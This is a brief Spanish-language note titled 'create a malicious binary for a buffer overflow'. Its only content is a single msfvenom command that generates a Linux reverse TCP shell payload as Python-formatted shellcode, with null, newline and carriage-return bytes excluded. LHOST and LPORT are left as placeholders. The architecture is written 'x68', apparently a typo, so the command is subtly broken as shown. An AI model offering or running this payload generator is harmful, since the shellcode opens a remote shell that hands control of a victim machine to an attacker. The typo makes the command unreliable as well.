
# crear un binario malicioso para un buffer overflow

```bash
1) msfvenom -p linux/x68/shell_reverse_tcp LHOST=ip LPORT=port -f python -b "\x00\x0a\x0d"
```